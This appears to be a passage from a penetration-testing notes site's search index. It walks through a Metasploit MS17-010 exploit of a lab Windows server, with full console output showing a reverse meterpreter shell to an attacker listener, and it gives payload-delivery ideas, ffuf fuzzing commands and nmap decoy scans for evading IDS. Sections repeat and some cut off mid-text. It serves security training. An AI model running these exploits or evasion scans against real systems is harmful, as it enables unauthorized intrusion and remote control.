How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave bl ank for auto) NAMED_PIPES /usr/share/metasploit-frame yes List of named pipes to check work/data/wordlists/named_p ipes.txt RHOSTS 10.129.201.97 yes The target host(s), range CIDR identifier, or h osts file with syntax 'file:<path>' RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder s hare SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.12 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port This time, we kept it simple and just used a windows/meterpreter/reverse_tcp payload. You can change this as you wish for a different shell type or obfuscate your attack more. Excute Attack and Receive A Callback. Execute \u00b6 msf6 exploit(windows/smb/ms17_010_psexec) > exploit [*] Started reverse TCP handler on 10.10.14.12:4444 [*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393 [*] 10.129.201.97:445 - Built a write-what-where primitive... [+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained! [*] 10.129.201.97:445 - Selecting PowerShell target [*] 10.129.201.97:445 - Executing the payload... [+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable... [*] Sending stage (175174 bytes) to 10.129.201.97 [*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > We have landed our exploit and gained a shell session. A SYSTEM level shell at that. As seen in the earlier MSF modules, now that we have an open session through Meterpreter, we are presented with the meterpreter > prompt. From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host. If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter. Identify the Native Shell Identify Our Shell \u00b6 meterpreter > shell Process 4844 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32> Just seeing C:\\Windows\\system32> can clue us in that we are just in a cmd.exe shell . To make sure, simply running the command help from within the shell will also let you know. If we were dropped into PowerShell, our prompt would look like PS C:\\Windows\\system32> . CMD-Prompt and Power[Shell]s for Fun and Profit \u00b6 Use CMD when: You are on an older host that may not include PowerShell. When you only require simple interactions/access to the host. When you plan to use simple batch files, net commands, or MS-DOS native tools. When you believe that execution policies may affect your ability to run scripts or other actions on the host. Use PowerShell when: You are planning to utilize cmdlets or other custom-built scripts. When you wish to interact with .NET objects instead of text output. When being stealthy is of lesser concern. If you are planning to interact with cloud-based services and hosts. If your scripts set and use Aliases.","title":"Windows Shells"},{"location":"shells_payloads/windows_shells/#enumerating-windows","text":"What are a few ways to determine if the host is likely a Windows Machine? Time To Live (TTL). A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. TTL values by OS We can also validate if host is Windows or not by using NMAP . For this example, we will utilize the -O option with verbose output -v to initialize an OS Identification scan against our target hrmns@htb[/htb]$ sudo nmap -v -O 192 .168.86.39 Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT Initiating ARP Ping Scan at 17:40 Scanning 192.168.86.39 [1 port] Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 17:40 Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed Initiating SYN Stealth Scan at 17:40 Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports] Discovered open port 139/tcp on 192.168.86.39 Discovered open port 135/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports) Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39) Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.010s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 902/tcp open iss-realsecure 912/tcp open apex-mesh MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate) Device type: general purpose Running: Microsoft Windows 10 OS CPE: cpe:/o:microsoft:windows_10 OS details: Microsoft Windows 10 1709 - 1909 Network Distance: 1 hop We can see the point labeled OS CPE: cpe:/o:microsoft:windows_10 and OS details: Microsoft Windows 10 1709 - 1909 . Nmap made this guess based on several different metrics it derives from the TCP/IP stack. If you run into issues and the scans turn up little results, attempt again with the -A and -Pn options. More Info how this proccess works: Nmap Docs . Be careful of this detection method. Implementing a firewall or other security features can obscure the host or mess the results up. When possible, use more than one check to make a determination. Now that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called banner.nse . In a real pentest, you will want to be as thorough as possible, making sure you have the full lay of the land. hrmns@htb[/htb]$ sudo nmap -v 192 .168.86.39 --script banner.nse Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT NSE: Loaded 1 scripts for scanning. <snip> Discovered open port 135/tcp on 192.168.86.39 Discovered open port 139/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports) NSE: Script scanning 192.168.86.39. Initiating NSE at 18:01 Completed NSE at 18:01, 20.11s elapsed Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.012s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 902/tcp open iss-realsecure | banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se |_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t 912/tcp open apex-mesh | banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto |_col:SOAP, MKSDisplayProtocol:VNC , , MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)","title":"Enumerating Windows"},{"location":"shells_payloads/windows_shells/#bats-dlls-msi-files","text":"When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use. Payload Types to consider DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls. Batch Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat . We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port. VBS VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code. MSI .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell. Powershell Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.","title":"Bats, DLLs, &amp; MSI Files"},{"location":"shells_payloads/windows_shells/#payload-generation","text":"Resource Description MSFVenom & Metasploit-Framework Source MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. Payloads All The Things Source Here, you can find many different resources and cheat sheets for payload generation and general methodology. Mythic C2 Framework Source The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. Nishang Soucre Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. Darkarmour Source Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.","title":"Payload Generation"},{"location":"shells_payloads/windows_shells/#payload-transfer-and-execution","text":"Impacket : Impacket is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with psexec , smbclient , wmi , Kerberos, and the ability to stand up an SMB server. Payloads All The Things : is a great resource to find quick oneliners to help transfer files across hosts expediently. SMB : SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links. Remote execution via MSF : Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically. Other Protocols : When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.","title":"Payload Transfer and Execution"},{"location":"shells_payloads/windows_shells/#example-compromise","text":"Enumerate the Host To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell. hrmns@htb[/htb]$ nmap -v -A 10 .129.201.97 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. Discovered open port 135/tcp on 10.129.201.97 Discovered open port 80/tcp on 10.129.201.97 Discovered open port 445/tcp on 10.129.201.97 Discovered open port 139/tcp on 10.129.201.97 Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports) Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host) NSE: Script scanning 10.129.201.97. Nmap scan report for 10.129.201.97 Host is up (0.13s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: 10.129.201.97 - / 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: SHELLS-WINBLUE | NetBIOS computer name: SHELLS-WINBLUE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-09-27T15:13:28-07:00 | smb-security-mode: | account_used: <blank> | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-09-27T22:13:30 |_ start_date: 2021-09-23T15:29:29 It is running Windows Server 2016 Standard 6.3. We have the hostname now, and we know it is not in a domain and is running several services. IIS could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from Metasploit, auxiliary/scanner/smb/smb_ms17_010 . Search for and decide on an exploit path Determine an Exploit Path msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary(scanner/smb/smb_ms17_010) > show options Module options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /usr/share/metasploit-framewor yes List of named pipes to check k/data/wordlists/named_pipes.t xt RHOSTS yes The target host(s), range CIDR identifier, or hosts f ile with syntax 'file:<path>' RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97 RHOSTS => 10.129.201.97 msf6 auxiliary(scanner/smb/smb_ms17_010) > run [+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit) [*] 10.129.201.97:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot. Select Exploit & Payload, then Deliver Choose & Configure Our Exploit & Payload msf6 > search eternal Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 2 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 3 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 4 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 5 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution","title":"Example Compromise"},{"location":"shells_payloads/windows_shells/#configure-the-exploit-and-payload","text":"msf6 > use 2 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_psexec) > options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave bl ank for auto) NAMED_PIPES /usr/share/metasploit-frame yes List of named pipes to check work/data/wordlists/named_p ipes.txt RHOSTS yes The target host(s), range CIDR identifier, or h osts file with syntax 'file:<path>' RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder s hare SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.86.48 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Be sure to set payload options correctly before running the exploit. In this instance, we need to ensure that our RHOSTS, LHOST, and LPORT fields are correctly set. For this attempt, accepting the defaults for the rest is OK.","title":"Configure the exploit and payload"},{"location":"shells_payloads/windows_shells/#validate","text":"msf6 exploit(windows/smb/ms17_010_psexec) > show options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave bl ank for auto) NAMED_PIPES /usr/share/metasploit-frame yes List of named pipes to check work/data/wordlists/named_p ipes.txt RHOSTS 10.129.201.97 yes The target host(s), range CIDR identifier, or h osts file with syntax 'file:<path>' RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder s hare SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.12 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port This time, we kept it simple and just used a windows/meterpreter/reverse_tcp payload. You can change this as you wish for a different shell type or obfuscate your attack more. Excute Attack and Receive A Callback.","title":"Validate"},{"location":"shells_payloads/windows_shells/#execute","text":"msf6 exploit(windows/smb/ms17_010_psexec) > exploit [*] Started reverse TCP handler on 10.10.14.12:4444 [*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393 [*] 10.129.201.97:445 - Built a write-what-where primitive... [+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained! [*] 10.129.201.97:445 - Selecting PowerShell target [*] 10.129.201.97:445 - Executing the payload... [+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable... [*] Sending stage (175174 bytes) to 10.129.201.97 [*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM meterpreter > We have landed our exploit and gained a shell session. A SYSTEM level shell at that. As seen in the earlier MSF modules, now that we have an open session through Meterpreter, we are presented with the meterpreter > prompt. From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host. If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter. Identify the Native Shell","title":"Execute"},{"location":"shells_payloads/windows_shells/#identify-our-shell","text":"meterpreter > shell Process 4844 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32> Just seeing C:\\Windows\\system32> can clue us in that we are just in a cmd.exe shell . To make sure, simply running the command help from within the shell will also let you know. If we were dropped into PowerShell, our prompt would look like PS C:\\Windows\\system32> .","title":"Identify Our Shell"},{"location":"shells_payloads/windows_shells/#cmd-prompt-and-powershells-for-fun-and-profit","text":"Use CMD when: You are on an older host that may not include PowerShell. When you only require simple interactions/access to the host. When you plan to use simple batch files, net commands, or MS-DOS native tools. When you believe that execution policies may affect your ability to run scripts or other actions on the host. Use PowerShell when: You are planning to utilize cmdlets or other custom-built scripts. When you wish to interact with .NET objects instead of text output. When being stealthy is of lesser concern. If you are planning to interact with cloud-based services and hosts. If your scripts set and use Aliases.","title":"CMD-Prompt and Power[Shell]s for Fun and Profit"},{"location":"tools/ffuf/","text":"Ffuf \u00b6 Command Description ffuf -h ffuf help ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ Directory Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ Extension Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php Page Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v Recursive Fuzzing ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/ Sub-domain Fuzzing ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx VHost Fuzzing ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx Parameter Fuzzing - GET ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx Parameter Fuzzing - POST ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx Value Fuzzing Wordlists \u00b6 Command Description /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt Directory/Page Wordlist /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt Extensions Wordlist /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt Domain Wordlist /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt Parameters Wordlist Misc \u00b6 Command Description sudo sh -c 'echo \"SERVER_IP academy.htb\" >> /etc/hosts' Add DNS entry for i in $(seq 1 1000); do echo $i >> ids.txt; done Create Sequence Wordlist curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' curl w/ POST","title":"Ffuf"},{"location":"tools/ffuf/#ffuf","text":"Command Description ffuf -h ffuf help ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ Directory Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ Extension Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php Page Fuzzing ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v Recursive Fuzzing ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/ Sub-domain Fuzzing ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx VHost Fuzzing ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx Parameter Fuzzing - GET ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx Parameter Fuzzing - POST ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx Value Fuzzing","title":"Ffuf"},{"location":"tools/ffuf/#wordlists","text":"Command Description /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt Directory/Page Wordlist /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt Extensions Wordlist /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt Domain Wordlist /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt Parameters Wordlist","title":"Wordlists"},{"location":"tools/ffuf/#misc","text":"Command Description sudo sh -c 'echo \"SERVER_IP academy.htb\" >> /etc/hosts' Add DNS entry for i in $(seq 1 1000); do echo $i >> ids.txt; done Create Sequence Wordlist curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' curl w/ POST","title":"Misc"},{"location":"tools/nmap/","text":"Network Mapper ( Nmap ) is an open-source network analysis and security auditing tool written in C, C++, Python, and Lua. It is designed to scan networks and identify which hosts are available on the network using raw packets, and services and applications, including the name and version, where possible. It can also identify the operating systems and versions of these hosts. Besides other features, Nmap also offers scanning capabilities that can determine if packet filters, firewalls, or intrusion detection systems (IDS) are configured as needed. Scanning Options \u00b6 Nmap Option Description 10.10.10.0/24 Target network range. -sn Disables port scanning. -Pn Disables ICMP Echo Requests -n Disables DNS Resolution. -PE Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace Shows all packets sent and received. --reason Displays the reason for a specific result. --disable-arp-ping Disables ARP Ping Requests. --top-ports=<num> Scans the specified top ports that have been defined as most frequent. -p- Scan all ports. -p22-110 Scan all ports between 22 and 110. -p22,25 Scans only the specified ports 22 and 25. -F Scans top 100 ports. -sS Performs an TCP SYN-Scan. -sA Performs an TCP ACK-Scan. -sU Performs an UDP Scan. -sV Scans the discovered services for their versions. -sC Perform a Script Scan with scripts that are categorized as \"default\". --script <script> Performs a Script Scan by using the specified scripts. -O Performs an OS Detection Scan to determine the OS of the target. -A Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 Sets the number of random Decoys that will be used to scan the target. -e Specifies the network interface that is used for the scan. -S 10.10.10.200 Specifies the source IP address for the scan. -g Specifies the source port for the scan. --dns-server <ns> DNS resolution is performed by using a specified name server. Output Options \u00b6 Nmap Option Description -oA filename Stores the results in all available formats starting with the name of \"filename\". -oN filename Stores the results in normal format with the name \"filename\". -oG filename Stores the results in \"grepable\" format with the name of \"filename\". -oX filename Stores the results in XML format with the name of \"filename\". Performance Options \u00b6 Nmap Option Description --max-retries <num> Sets the number of retries for scans of specific ports. --stats-every=5s Displays scan's status every 5 seconds. -v/-vv Displays verbose output during the scan. --initial-rtt-timeout 50ms Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms Sets the specified time value as maximum RTT timeout. --min-rate 300 Sets the number of packets that will be sent simultaneously. -T <0-5> Specifies the specific timing template. Detect IDS/IPS \u00b6 Unlike firewalls and their rules, the detection of IDS/IPS systems is much more difficult because these are passive traffic monitoring systems. IDS systems examine all connections between hosts. If the IDS finds packets containing the defined contents or specifications, the administrator is notified and takes appropriate action in the worst case. IDS systems alone are usually there to help administrators detect potential attacks on their network. They can then decide how to handle such connections. We can trigger certain security measures from an administrator, for example, by aggressively scanning a single port and its service. Based on whether specific security measures are taken, we can detect if the network has some monitoring applications or not. One method to determine whether such IPS system is present in the target network is to scan from a single host ( VPS ). If at any time this host is blocked and has no access to the target network, we know that the administrator has taken some security measures. Accordingly, we can continue our penetration test with another VPS . Consequently, we know that we need to be quieter with our scans and, in the best case, disguise all interactions with the target network and its services. Decoys \u00b6 There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method ( -D ) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random ( RND ) a specific number (for example: 5 ) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. hrmns@htb[/htb]$ sudo nmap 10 .129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST SENT (0.0378s) TCP 102.52.161.59:59289 > 10.129.2.28:80 S ttl=42 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0378s) TCP 10.10.14.2:59289 > 10.129.2.28:80 S ttl=59 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 210.120.38.29:59289 > 10.129.2.28:80 S ttl=37 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 191.6.64.171:59289 > 10.129.2.28:80 S ttl=38 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 184.178.194.209:59289 > 10.129.2.28:80 S ttl=39 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 43.21.121.33:59289 > 10.129.2.28:80 S ttl=55 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> RCVD (0.1370s) TCP 10.129.2.28:80 > 10.10.14.2:59289 SA ttl=64 id=0 iplen=44 seq=4056111701 win=64240 <mss 1460> Nmap scan report for 10.129.2.28 Host is up (0.099s latency). PORT STATE SERVICE 80/tcp open http MAC Address: DE:AD:00:00:BE:EF (Intel Corporate) Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds","title":"Nmap"},{"location":"tools/nmap/#scanning-options","text":"Nmap Option Description 10.10.10.0/24 Target network range. -sn Disables port scanning. -Pn Disables ICMP Echo Requests -n Disables DNS Resolution. -PE Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace Shows all packets sent and received. --reason Displays the reason for a specific result. --disable-arp-ping Disables ARP Ping Requests. --top-ports=<num> Scans the specified top ports that have been defined as most frequent. -p- Scan all ports. -p22-110 Scan all ports between 22 and 110. -p22,25 Scans only the specified ports 22 and 25. -F Scans top 100 ports. -sS Performs an TCP SYN-Scan. -sA Performs an TCP ACK-Scan. -sU Performs an UDP Scan. -sV Scans the discovered services for their versions. -sC Perform a Script Scan with scripts that are categorized as \"default\". --script <script> Performs a Script Scan by using the specified scripts. -O Performs an OS Detection Scan to determine the OS of the target. -A Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 Sets the number of random Decoys that will be used to scan the target. -e Specifies the network interface that is used for the scan. -S 10.10.10.200 Specifies the source IP address for the scan. -g Specifies the source port for the scan. --dns-server <ns> DNS resolution is performed by using a specified name server.","title":"Scanning Options"},{"location":"tools/nmap/#output-options","text":"Nmap Option Description -oA filename Stores the results in all available formats starting with the name of \"filename\". -oN filename Stores the results in normal format with the name \"filename\". -oG filename Stores the results in \"grepable\" format with the name of \"filename\". -oX filename Stores the results in XML format with the name of \"filename\".","title":"Output Options"},{"location":"tools/nmap/#performance-options","text":"Nmap Option Description --max-retries <num> Sets the number of retries for scans of specific ports. --stats-every=5s Displays scan's status every 5 seconds. -v/-vv Displays verbose output during the scan. --initial-rtt-timeout 50ms Sets the specified time value as initial RTT timeout. 